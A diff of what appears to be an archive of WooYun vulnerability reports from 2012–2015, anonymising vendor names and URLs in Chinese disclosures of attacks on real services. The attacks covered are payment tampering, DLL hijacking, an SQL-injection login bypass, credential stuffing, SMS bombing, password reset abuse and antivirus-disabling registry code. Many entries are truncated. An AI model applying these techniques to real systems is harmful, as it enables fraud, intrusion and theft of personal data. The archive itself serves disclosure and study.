-**详情**: 上次的新浪微博gsid漏洞至今仍未修复，还有很多用户不乏加V号均泄露gsid，对此很是不爽...转入今天的正题，银泰网联合招商银行搞了次一分钱送活动，先吊胃口，详情如下：挑个东东先下单...http://www.yintai.com/product/productdetail.aspx?itemcode=20-277-4661C话说这模特体型还没我正呢...然后扔购物车提交订单付款方式选招商银行网银付款，you know点付款的瞬间，本想截一下包改订单，但是还有更大的收获...尼玛，这不科学...果断改掉，成功不知道付款后会咋样，不过不敢付款，怕请喝茶...别说临时工干的就行了
+**详情**: 上次的某社交平台某社交平台gsid漏洞至今仍未修复，还有很多用户不乏加V号均泄露gsid，对此很是不爽...转入今天的正题，银泰网联合招商银行搞了次一分钱送活动，先吊胃口，详情如下：挑个东东先下单...https://example.com/[已脱敏] know点付款的瞬间，本想截一下包改订单，但是还有更大的收获...尼玛，这不科学...果断改掉，成功不知道付款后会咋样，不过不敢付款，怕请喝茶...别说临时工干的就行了
 
 **POC**: (见原文)
 
@@ -9641,7 +9641,7 @@
 ---
 
 ---
-### [wooyun-2013-034978] 多个客户端应用dll劫持漏洞（Skype，优酷，新浪，快车，奇艺，百度音乐，Cbox）
+### [wooyun-2013-034978] 多个客户端应用dll劫持漏洞（Skype，优酷，某社交平台，快车，奇艺，某搜索引擎音乐，Cbox）
 **厂商**: 多个应用厂商 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
@@ -9653,7 +9653,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 经过第三方软件测试发现SHPlayer.exe运行时会加载一个不存在的DLL文件ieframe.dll 。只要自己写一个ieframe.dll与SHPlayer.exe放在同一目录，这样就可以在运行SHPlayer.exe的时候会同时加载ieframe.dll，这个ieframe.dll可以为自制的任意恶意dll。此方法可用于劫持启动木马病毒。（我这里放入特定的dll后，运行SHPlayer.exe会弹出一个特定的框显示"Hello from MyDLL!"，如下图）当时劫持时使用的DLL下载地址：密码58n6http://pan.baidu.com/share/link?shareid=172262024&uk=4164057933其他应用：Skype 2013.8.22影响最新版本Version: 6.6.4.14 其它版本没作测试。   avrt.dll优酷PC客户端 2013.8.
+**详情**: 经过第三方软件测试发现SHPlayer.exe运行时会加载一个不存在的DLL文件ieframe.dll 。只要自己写一个ieframe.dll与SHPlayer.exe放在同一目录，这样就可以在运行SHPlayer.exe的时候会同时加载ieframe.dll，这个ieframe.dll可以为自制的任意恶意dll。此方法可用于劫持启动木马病毒。（我这里放入特定的dll后，运行SHPlayer.exe会弹出一个特定的框显示"Hello from MyDLL!"，如下图）当时劫持时使用的DLL下载地址：密码58n6https://example.com/[已脱敏] 2013.8.22影响最新版本Version: [IP已脱敏] 其它版本没作测试。   avrt.dll优酷PC客户端 2013.8.
 
 **POC**: (见原文)
 
@@ -9675,7 +9675,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1、国家邮政局申诉系统由于网站设计缺陷，无验证码和错误登录次数限制，可撞库登录http://sswz.chinapost.gov.cn/login.do2、使用用户名top500+简单的弱口令字典撞库，大量弱口令，点到为止3、泄露用户姓名+手机号码+快递单号+通讯的详细地址
+**详情**: 1、国家邮政局申诉系统由于网站设计缺陷，无验证码和错误登录次数限制，可撞库登录https://example.com/[已脱敏]
 
 **POC**: 如上
 
@@ -9763,7 +9763,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: demo地址：http://imall.kesion.com修改购物车内商品数量时，抓包修改为-1，提交订单后，点击支付，该订单直接支付成功。
+**详情**: demo地址：https://example.com/[已脱敏]
 
 **POC**: 如上
 
@@ -9807,7 +9807,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 理论是400万+用户但是绑定邮箱的不知道多少需要邮箱绑定用户以这个漏洞的id为测试目标：WooYun: 超好玩主站设计逻辑缺陷重置任意账号密码来找回密码处，选择邮箱http://passport.18touch.com/findpwd以zhuowenlong@18touch.com 123123，我把它密码改为123456上面验证码随便填，完全是个摆设点击重置，直接登入了这个是我的urlhttp://passport.18touch.com/4056754405万对吧，可以全部遍历随便找个带绑定邮箱的http://passport.18touch.com/4直接按照上面的方法重置他10187@qq.com 123456已经登入了
+**详情**: 理论是400万+用户但是绑定邮箱的不知道多少需要邮箱绑定用户以这个漏洞的id为测试目标：WooYun: 超好玩主站设计逻辑缺陷重置任意账号密码来找回密码处，选择邮箱https://example.com/[已脱敏] 123123，我把它密码改为123456上面验证码随便填，完全是个摆设点击重置，直接登入了这个是我的urlhttps://example.com/[已脱敏] 123456已经登入了
 
 **POC**: 邮箱注册用户
 
@@ -9839,8 +9839,8 @@
 ---
 
 ---
-### [wooyun-2013-028186] 网易某分站短信验证轰炸
-**厂商**: 网易 | **年份**: 2013 | **类型**: 网络设计缺陷/逻辑错误
+### [wooyun-2013-028186] 某互联网公司某分站短信验证轰炸
+**厂商**: 某互联网公司 | **年份**: 2013 | **类型**: 网络设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -9895,7 +9895,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 这个站！http://subscribe.chinadaily.com.cn注册个号，然后订购日报！详情看图！
+**详情**: 这个站！https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -9939,7 +9939,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1、漏洞地址：http://order.eben.cn/2、先选择到货支付，提交订单时抓包，total_price 改成33、价格变成了34、第二个选择支付宝支付，重复上一个过程，会便宜一千块 - -
+**详情**: 1、漏洞地址：https://example.com/[已脱敏] 改成33、价格变成了34、第二个选择某电商平台支付，重复上一个过程，会便宜一千块 - -
 
 **POC**: (见原文)
 
@@ -9961,7 +9961,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 注册购买路由交换设备后到购物车支付，比如用支付宝支付可以任意篡改交易金额，漏洞等级高。
+**详情**: 注册购买路由交换设备后到购物车支付，比如用某电商平台支付可以任意篡改交易金额，漏洞等级高。
 
 **POC**: 图一图二图三图四图五图六图七图八图九图⑩图十一
 
@@ -10015,8 +10015,8 @@
 ---
 
 ---
-### [wooyun-2015-0121598] 中国移动某业务支付逻辑漏洞
-**厂商**: 中国移动 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2015-0121598] 某运营商某业务支付逻辑漏洞
+**厂商**: 某运营商 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -10027,7 +10027,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 众所周知，单机手机游戏也是可以充值的。而充值时会通过第三方的方式收费，比如中国移动的扣费短信发送默认。以植物大战僵尸2为例我在某手机助手里下载了这款应用，然后使用了某手机管理的权限管理功能（当然任何手机管家都可以做到这点），将短信发送功能设置为提示（直接设置为禁止就好，这里是为了方便演示）然后进入游戏充值这里选择禁止成功。。。。看第一张图就知道我是几点测试的。一直到现在几个小时了我没收到扣费短信，话费也没有减少。然后我又测试了另一款应用，appstore付费榜第一的格斗游戏，当然是安卓移植版。火柴人联盟。这时我的钻石是初始的100，选择2¥同样选择禁止这时再看，钻石已经变为120。同样没有扣费短信，话费也没有任何变化另附支付时需联网
+**详情**: 众所周知，单机手机游戏也是可以充值的。而充值时会通过第三方的方式收费，比如某运营商的扣费短信发送默认。以植物大战僵尸2为例我在某手机助手里下载了这款应用，然后使用了某手机管理的权限管理功能（当然任何手机管家都可以做到这点），将短信发送功能设置为提示（直接设置为禁止就好，这里是为了方便演示）然后进入游戏充值这里选择禁止成功。。。。看第一张图就知道我是几点测试的。一直到现在几个小时了我没收到扣费短信，话费也没有减少。然后我又测试了另一款应用，appstore付费榜第一的格斗游戏，当然是安卓移植版。火柴人联盟。这时我的钻石是初始的100，选择2¥同样选择禁止这时再看，钻石已经变为120。同样没有扣费短信，话费也没有任何变化另附支付时需联网
 
 **POC**: 如上
 
@@ -10037,8 +10037,8 @@
 ---
 
 ---
-### [wooyun-2015-0123699] 百度卫士全局注入模块失效漏洞
-**厂商**: 百度 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2015-0123699] 某搜索引擎卫士全局注入模块失效漏洞
+**厂商**: 某搜索引擎 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -10049,7 +10049,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 百度卫士开启电脑专家功能后，AppInit_DLLs会添加上C:\PROGRA~1\COMMON~1\Baidu\BDWEBA~1\20320~1.0\BDEWebAdapterFrame.dll这个路径名，作为全局注入的模块。但百度卫士没有对这个注册表键值进行保护及修复，很容易被篡改掉，导致电脑专家功能失效。
+**详情**: 某搜索引擎卫士开启电脑专家功能后，AppInit_DLLs会添加上C:\PROGRA~1\COMMON~1\Baidu\BDWEBA~1\20320~1.0\BDEWebAdapterFrame.dll这个路径名，作为全局注入的模块。但某搜索引擎卫士没有对这个注册表键值进行保护及修复，很容易被篡改掉，导致电脑专家功能失效。
 
 **POC**: LPCTSTR p = _T("");DWORD dwSet = SHSetValue(HKEY_LOCAL_MACHINE, _T("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows"),_T("AppInit_DLLs"), REG_SZ, (LPCVOID)p, (_tcslen(p) + 1)*sizeof(TCHAR));
 
@@ -10059,8 +10059,8 @@
 ---
 
 ---
-### [wooyun-2015-0108697] 中国电信某市分站支付逻辑漏洞
-**厂商**: 中国电信 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误
+### [wooyun-2015-0108697] 某运营商某市分站支付逻辑漏洞
+**厂商**: 某运营商 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -10071,7 +10071,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://mall.sh.189.cn/mall/tao-number.html挑选靓号区域 存在低价购买高价靓号的问题（50入网费+0元号费购买6000元顶级号码）
+**详情**: https://example.com/[已脱敏] 存在低价购买高价靓号的问题（50入网费+0元号费购买6000元顶级号码）
 
 **POC**: 审查元素找到系统分配给号码的phoneID找个最低级的号码 增加到购物车 截包替换为刚才找到的号码和号码ID提交订单填写各种信息后提交就是这样...穷逼...就不支付了
 
@@ -10235,8 +10235,8 @@
 ---
 
 ---
-### [wooyun-2013-044701] Fuzzing之#携程旅行网某中心存在弱口令
-**厂商**: 携程旅行网 | **年份**: 2013 | **类型**: 后台弱口令
+### [wooyun-2013-044701] Fuzzing之#某旅游平台旅行网某中心存在弱口令
+**厂商**: 某旅游平台旅行网 | **年份**: 2013 | **类型**: 后台弱口令
 
 **元思考**: 触发信号: 认证接口
 
@@ -10247,7 +10247,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 此测试时针对wordpress的，大家都知道Wordpress在核心代码安全系数很高，而在逻辑设计上，却有很多问题。遍历用户名：http://ued.ctrip.com/blog/?author=1http://ued.ctrip.com/blog/?author=55通过如上链接，你只需要不停的更换author的id，就能遍历出整个Wordpress数据库内用户的username。本次测试过程中，获取到携程旅行网http://ued.ctrip.com/blog/的用户名如下：1==>用户名：admin2==>用户名：Lucky3==>用户名：阿瞬4==>用户名：GreatHan5==>用户名：nnMA6==>用户名：Neao7==>用户名：小飞猪8==>用户名：祝9==>用户名：子子10==>用户名：m11==>用户名：Slli12==>用户名：小灰灰13==>用户名：≮流光恋羽≯14
+**详情**: 此测试时针对wordpress的，大家都知道Wordpress在核心代码安全系数很高，而在逻辑设计上，却有很多问题。遍历用户名：https://example.com/[已脱敏]
 
 **POC**: 操作后台数据，留后门什么的都没动，后台数据没做任何操作，谢谢。然后，就是继续收集信息咯，各种个人资料收集中......期待续集......还个问题，这个wordpress是3.3.1的，好像3.3.1的wordpress有几个漏洞的，没测试，管理可以升级了。
 
@@ -10271,7 +10271,7 @@
 
 **详情**: safari在打开带有username/password的http url的时候会将账户密码保留在地址中,由于safari在获取location值的时候会将url中的username部分进行解码,这样我们就可以通过控制username部分污染后面部分.
 
-**POC**: safari访问http://www.qq.com%2f@mmme.me/<script>alert(location=='http://www.qq.com/@mmme.me/')</script>
+**POC**: safari访问https://example.com/[已脱敏]'https://example.com/[已脱敏]')</script>
 
 **绕过**: 直接利用
 
@@ -10381,7 +10381,7 @@
 
 **详情**: 浏览器的广告过滤没有过滤带target的表单弹窗，而且在内容加载完成之前就显示了地址，可以参考chrome的做法--页面没有触发下载完成事件前有任何改动都应该将页面地址栏置为about:blank或者类似firefox的做法--弹窗时页面没加载完之前地址一律显示about:blank，只在标题栏上显示地址，加载完之后再替换
 
-**POC**: <script>var k=1;window.onblur=s();document.getElementById("xxx").submit();function s(){if(k>1){window.open("javascript:document.write(3)","lll");}k++;}function s2(){window.open("javascript:document.write(3)","lll");window.onblur=function(){};}</script><body><form id="xxx" action="https://www.baidu.c
+**POC**: <script>var k=1;window.onblur=s();document.getElementById("xxx").submit();function s(){if(k>1){window.open("javascript:document.write(3)","lll");}k++;}function s2(){window.open("javascript:document.write(3)","lll");window.onblur=function(){};}</script><body><form id="xxx" action="https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -10401,7 +10401,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 问题出在微信端的 富有收货宝点击商户服务-商户绑定/解绑跳转到登陆页面 发现是有验证码的但是验证码存在逻辑漏洞 可绕过首先抓包POST /fubox/bind/manager?uuid=34d12c04-abc9-4eac-bd1c-1929399c10d9 HTTP/1.1Host: sjbwx.fuiou.comAccept: */*X-Requested-With: XMLHttpRequestAccept-Encoding: gzip, deflateAccept-Language: zh-cnContent-Type: application/x-www-form-urlencodedOrigin: http://sjbwx.fuiou.comContent-Length: 50Connection: closeUser-Agent: Mozilla/5.0 (iPhone; C
+**详情**: 问题出在某互联网公司端的 富有收货宝点击商户服务-商户绑定/解绑跳转到登陆页面 发现是有验证码的但是验证码存在逻辑漏洞 可绕过首先抓包POST /fubox/bind/manager?uuid=34d12c04-abc9-4eac-bd1c-1929399c10d9 HTTP/1.1Host: sjbwx.fuiou.comAccept: */*X-Requested-With: XMLHttpRequestAccept-Encoding: gzip, deflateAccept-Language: zh-cnContent-Type: application/x-www-form-urlencodedOrigin: https://example.com/[已脱敏] 50Connection: closeUser-Agent: Mozilla/5.0 (iPhone; C
 
 **POC**: 成功绑定
 
@@ -10445,7 +10445,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://android.myapp.com/myapp/detail.htm?apkName=com.ht.exam1.日志打印，包含用户账号密码、loginkey、短信验证码登录ps：登录请求如下，具体内容经过APP加密，并不是明文传输登录信息由于APP将参数打印在log中。2.验证码回显，可重置密码ps:查看发送验证码请求。返回结果是加密的。查看log，同样将结果解密并打印出来ps:或者利用第三点的脚本将返回内容进行解密输入验证码即可重置成功3.APP可反编译。获得通讯数据加解密算法+短信轰炸加解密算法mask 区域*****56789QWEQWEEWQ*****Three_Des_IV = "01234567"def Three_DesEncrypt(str): k = triple_des(Three_Des_Key.upper(), ECB, Three_Des_IV, p
+**详情**: https://example.com/[已脱敏] 区域*****56789QWEQWEEWQ*****Three_Des_IV = "01234567"def Three_DesEncrypt(str): k = triple_des(Three_Des_Key.upper(), ECB, Three_Des_IV, p
 
 **POC**: (见原文)
 
@@ -10467,7 +10467,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 在新网选好域名，结账原来的价格是399元，下一步，填写域名信息选择填写其他DNS，这一步很关键接下来付款将“http://www.xinnet.com/account/recharge.do?method=alipay&money=399”改成“http://www.xinnet.com/account/recharge.do?method=alipay&money=任意金额”付款成功到我的域名看看没有域名？，我的全部身家0.1元打水漂了？查看下whois虽然在新网的后台不能管理域名，但是域名已经注册成功了，而且之前填写的是第三方DNS，在dnsopd添加下这个域名，NS记录已经是dnspod的了，添加个a记录看看看看解析成功没
+**详情**: 在新网选好域名，结账原来的价格是399元，下一步，填写域名信息选择填写其他DNS，这一步很关键接下来付款将“https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -10489,7 +10489,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: store.tdxinfo.com注册用户！登陆！选择天地行！找一个预定一下！点击提交订单的时候抓包！然后只修改一个参数！将totalprice修改为0.01！这里也许是四舍五入，然后就成了0元了！我们选择支付宝支付(选什么都一样)！
+**详情**: store.tdxinfo.com注册用户！登陆！选择天地行！找一个预定一下！点击提交订单的时候抓包！然后只修改一个参数！将totalprice修改为0.01！这里也许是四舍五入，然后就成了0元了！我们选择某电商平台支付(选什么都一样)！
 
 **POC**: (见原文)
 
@@ -10511,7 +10511,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://pay.game.tiexue.net/ 铁血游戏充值漏洞
+**详情**: https://example.com/[已脱敏] 铁血游戏充值漏洞
 
 **POC**: 一元钱等于10金币，不过改了单价后就变成1元等于100元了，这个原理我还真没弄懂。改了下JS发现好像没用啊，不管了，就这样吧。
 
@@ -10533,7 +10533,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1、漏洞类型发送验证码页面未限制发送次数导致短信轰炸2、涉及漏洞的产品名称、产品组件和相关软件版本、文件版本360软件开放平台网站http://open.soft.360.cn/getvcode.php3、重现此漏洞的步骤和方法POST “m=手机号”至http://open.soft.360.cn/getvcode.php4、POC或利用代码<code>POST /getvcode.php HTTP/1.1Host: open.soft.360.cnProxy-Connection: keep-aliveContent-Length: 13Origin: http://open.soft.360.cnUser-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963
+**详情**: 1、漏洞类型发送验证码页面未限制发送次数导致短信轰炸2、涉及漏洞的产品名称、产品组件和相关软件版本、文件版本360软件开放平台网站https://example.com/[已脱敏] “m=手机号”至https://example.com/[已脱敏] /getvcode.php HTTP/1.1Host: open.soft.360.cnProxy-Connection: keep-aliveContent-Length: 13Origin: https://example.com/[已脱敏] Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963
 
 **POC**: 返回1发送成功。
 
@@ -10543,8 +10543,8 @@
 ---
 
 ---
-### [wooyun-2012-012966] 微信功能设计缺陷导致网络钓鱼利用
-**厂商**: 微信 | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2012-012966] 某互联网公司功能设计缺陷导致网络钓鱼利用
+**厂商**: 某互联网公司 | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -10555,7 +10555,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1，在微信摇一摇里弄个美女头像2，不停摇一摇，然后就会有人加3，如果有人加你，他的账号就会暴露给你，收集账号4，收集足够多的账号后，再把头像给换成官方的头像，名称改成官方的名称5，通过别人的加好友请求，发中奖信息钓鱼网站：weixi08.com
+**详情**: 1，在某互联网公司摇一摇里弄个美女头像2，不停摇一摇，然后就会有人加3，如果有人加你，他的账号就会暴露给你，收集账号4，收集足够多的账号后，再把头像给换成官方的头像，名称改成官方的名称5，通过别人的加好友请求，发中奖信息钓鱼网站：weixi08.com
 
 **POC**: (见原文)
 
@@ -10587,8 +10587,8 @@
 ---
 
 ---
-### [wooyun-2012-010966] 淘宝恶意申诉漏洞，利用规则成功N起案件
-**厂商**: 淘宝网 | **年份**: 2012 | **类型**: 账户体系控制不严
+### [wooyun-2012-010966] 某电商平台恶意申诉漏洞，利用规则成功N起案件
+**厂商**: 某电商平台网 | **年份**: 2012 | **类型**: 账户体系控制不严
 
 **元思考**: 触发信号: 后台管理
 
@@ -10599,9 +10599,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 淘宝恶意申诉规则绕过，充值平台业务逻辑漏洞严重，自动充值平台后台显示交易成功，等于充值平台确认了，成功了居然还有申请退款的功能。淘宝平台间机制缺失导致商户经济损失严重，大量商户放弃淘宝，甚至用同样手法去行骗。
+**详情**: 某电商平台恶意申诉规则绕过，充值平台业务逻辑漏洞严重，自动充值平台后台显示交易成功，等于充值平台确认了，成功了居然还有申请退款的功能。某电商平台平台间机制缺失导致商户经济损失严重，大量商户放弃某电商平台，甚至用同样手法去行骗。
 
-**POC**: 条件说明：卖家：1、淘宝承诺：7*24小时 在线货源平台自动充值。自动充值系统完全自动处理订单，无须客服24小时在线，充值管理成本低。 优质丰富货源产品价格实惠、产品分布广泛、充值即时到帐、时间管理更有效。 安全保障供货商严格审核通过，卖家账户安全有可靠、稳定的保障。 轻松开店淘宝充值平台拥有专门的服务团队，为卖买双方提供及时有效的解答和服务。 产品排名更优势卖家拥有平台的专属标识、产品方便买家搜索和充值 无缝对接平台产品可一键直接发布在淘宝，保留淘宝功能、让卖家效率更高2、经过测试秒冲到账无问题。买家【诈骗人员】：购买QB充值卡8张，连续4次购买。分别为444.44元。购买后立刻进行连续申诉
+**POC**: 条件说明：卖家：1、某电商平台承诺：7*24小时 在线货源平台自动充值。自动充值系统完全自动处理订单，无须客服24小时在线，充值管理成本低。 优质丰富货源产品价格实惠、产品分布广泛、充值即时到帐、时间管理更有效。 安全保障供货商严格审核通过，卖家账户安全有可靠、稳定的保障。 轻松开店某电商平台充值平台拥有专门的服务团队，为卖买双方提供及时有效的解答和服务。 产品排名更优势卖家拥有平台的专属标识、产品方便买家搜索和充值 无缝对接平台产品可一键直接发布在某电商平台，保留某电商平台功能、让卖家效率更高2、经过测试秒冲到账无问题。买家【诈骗人员】：购买QB充值卡8张，连续4次购买。分别为444.44元。购买后立刻进行连续申诉
 
 **绕过**: 过滤绕过
 
@@ -10665,7 +10665,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://m.110.com/login/在m.110.com设计不当，接口没限制，没加验证码，导致爆破返回四位数就正确。这里用csdn的库，由于csdn是技术圈的，和法律圈不搭边，所以没中那么多。，。。23	wangang	******	200	false	false	10209002	lei_only	******	200	false	false	1020
+**详情**: https://example.com/[已脱敏]	wangang	******	200	false	false	10209002	lei_only	******	200	false	false	1020
 
 **POC**: 在m.110.com设计不当，接口没限制，没加验证码，导致爆破返回四位数就正确。这里用csdn的库，由于csdn是技术圈的，和法律圈不搭边，所以没中那么多。，。。23	wangang	*****	200	false	false	10209002	lei_only	******	200	false	false	1020
 
@@ -10731,9 +10731,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 亿禾工场 http://www.jxehe.com/对合作厂家影响还是比较大的举例admin'or'1'='1嘉兴市实验小学创办于1905年，迄今已有一百多年的历史。嘉兴市实验小学是一所省一流的现代化、示范化学校。学校现有东、西两校区。嘉兴市实验小学http://www.jxsyxx.com/Manage/所有学生数据随便进去一个看看 身份证 监护人电话都有监护人姓名 单位 银行帐号简直就是黑产必备咦 还同步了校讯通就选这个ZZX看看 登录成功跳转校讯通看看不错不错是可以登录的在看看别家用亿禾工场的系统的后台会不会也是万能密码海宁市紫薇小学http://www.hnzwxx.com/Manage/依旧万能密码继续南湖区名师工作室http://www.nhqms.com/Manage/用户名都是手机号码.继续东北师范大学南湖实验学校http://www.dbsdnhsy.com/Manage
+**详情**: 亿禾工场 https://example.com/[已脱敏]'or'1'='1嘉兴市实验小学创办于1905年，迄今已有一百多年的历史。嘉兴市实验小学是一所省一流的现代化、示范化学校。学校现有东、西两校区。嘉兴市实验小学https://example.com/[已脱敏] 身份证 监护人电话都有监护人姓名 单位 银行帐号简直就是黑产必备咦 还同步了校讯通就选这个ZZX看看 登录成功跳转校讯通看看不错不错是可以登录的在看看别家用亿禾工场的系统的后台会不会也是万能密码海宁市紫薇小学https://example.com/[已脱敏]
 
-**POC**: 亿禾工场 http://www.jxehe.com/对合作厂家影响还是比较大的举例admin'or'1'='1嘉兴市实验小学创办于1905年，迄今已有一百多年的历史。嘉兴市实验小学是一所省一流的现代化、示范化学校。学校现有东、西两校区。嘉兴市实验小学http://www.jxsyxx.com/Manage/所有学生数据随便进去一个看看 身份证 监护人电话都有监护人姓名 单位 银行帐号简直就是黑产必备咦 还同步了校讯通就选这个ZZX看看 登录成功跳转校讯通看看不错不错是可以登录的在看看别家用亿禾工场的系统的后台会不会也是万能密码海宁市紫薇小学http://www.hnzwxx.com/Manag
+**POC**: 亿禾工场 https://example.com/[已脱敏]'or'1'='1嘉兴市实验小学创办于1905年，迄今已有一百多年的历史。嘉兴市实验小学是一所省一流的现代化、示范化学校。学校现有东、西两校区。嘉兴市实验小学https://example.com/[已脱敏] 身份证 监护人电话都有监护人姓名 单位 银行帐号简直就是黑产必备咦 还同步了校讯通就选这个ZZX看看 登录成功跳转校讯通看看不错不错是可以登录的在看看别家用亿禾工场的系统的后台会不会也是万能密码海宁市紫薇小学https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -10819,9 +10819,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 360隐私保险箱程序锁，加密相册后，打开相册，应该输入密码，否则看不到里面的照片。但是，在文件管理处，找到相册的文件夹，可以看到，相册的缩略图，虽然看不到清晰的图片，但是可以通过QQ的图片发送方式，来转发到另外一个QQ小号，来观看高清的图片。在打开那张缩略图的时候，会让用户选择打开方式，有一个相册打开，一个通过QQ打开，入股用户通过相册打开，会输入密码，但是如果用户选择通过QQ打开的时候，是打开的QQ图片发送功能，就不用输入密码，且会自动发送原高清图片。演示视频：http://vliveachy.tc.qq.com/vwecam.tc.qq.com/1006_4273126e0e36451aab85dd3ad259b1f4.f20.mp4?ptype=http&ocid=1411588012&ocid=227024812因不支持mp4格式 只得外链，请谅解！
+**详情**: 360隐私保险箱程序锁，加密相册后，打开相册，应该输入密码，否则看不到里面的照片。但是，在文件管理处，找到相册的文件夹，可以看到，相册的缩略图，虽然看不到清晰的图片，但是可以通过某互联网公司的图片发送方式，来转发到另外一个某互联网公司小号，来观看高清的图片。在打开那张缩略图的时候，会让用户选择打开方式，有一个相册打开，一个通过某互联网公司打开，入股用户通过相册打开，会输入密码，但是如果用户选择通过某互联网公司打开的时候，是打开的某互联网公司图片发送功能，就不用输入密码，且会自动发送原高清图片。演示视频：https://example.com/[已脱敏] 只得外链，请谅解！
 
-**POC**: 证明视频：http://vliveachy.tc.qq.com/vwecam.tc.qq.com/1006_4273126e0e36451aab85dd3ad259b1f4.f20.mp4?ptype=http&ocid=1411588012&ocid=227024812因不支持mp4格式 只得外链，请谅解！
+**POC**: 证明视频：https://example.com/[已脱敏] 只得外链，请谅解！
 
 **绕过**: 直接利用
 
@@ -10829,8 +10829,8 @@
 ---
 
 ---
-### [wooyun-2013-026814] 支付宝某功能可能导致短信轰炸
-**厂商**: 支付宝 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误
+### [wooyun-2013-026814] 某电商平台某功能可能导致短信轰炸
+**厂商**: 某电商平台 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -10841,7 +10841,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 问题发生在域https://excashier.alipay.com这是什么合作支付还不清楚！首先我在测试优酷的支付是否存在安全问题发现优酷支付的时候请求了https://excashier.alipay.com/standard/trade20001/templateFlow.htm?orderId=3c1bb81c789148ceb67eba9515aad247&action=init这里只需要输入用户邮箱即可 发送短信给用户于是用burp抓包看一下设置邮箱 进行遍历返回超过6000字节的为成功了 小跑了一下成功了不少支付宝还是很不错的 手机看不到验证码3次过期
+**详情**: 问题发生在域https://example.com/[已脱敏] 发送短信给用户于是用burp抓包看一下设置邮箱 进行遍历返回超过6000字节的为成功了 小跑了一下成功了不少某电商平台还是很不错的 手机看不到验证码3次过期
 
 **POC**: 看看短信把如果被恶意利用还是挺吓人的！
 
@@ -10873,8 +10873,8 @@
 ---
 
 ---
-### [wooyun-2014-088355] 腾讯QQ某匿名活动疑似可泄漏对方QQ号码（通话留痕）
-**厂商**: 腾讯 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2014-088355] 某互联网公司某互联网公司某匿名活动疑似可泄漏对方某互联网公司号码（通话留痕）
+**厂商**: 某互联网公司 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -10885,7 +10885,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 手机qq新增假面狂欢夜，我等屌丝岂能错过偶遇白富美的机会，果断抄起手机开始语音。。半天没遇到个妹子，唉，苦逼了。。躺下来歇会，我尼玛，这都是大叔哪行啊，猥琐流走起，掀起我的大板砖电脑进行抓包不错，开始语音，随机匹配陌生人，据官方说是“神秘夜话，语音通话不留痕”以下是抓包结果：里边有uin字段，既是匹配陌生人的qq号啦，所谓的假面狂欢夜，其实并不是找不到的。。只可惜这两个都是汉子啊，不信？有图为证啊，本人亲自做了验证这大哥不诚实，说是点了两下，得持续一个多小时。。。好不容易碰到个妹子，没聊就给我挂了，找到她的qq我尼玛，qq验证消息，你爱谁？我尼玛哪知道，难不成是隔壁老王？不对呀，算了，放弃了。。22万多人，我就不信没有妹子，我得赶紧进被窝语音了，哈哈哈，找我的白富美妹子去。。。
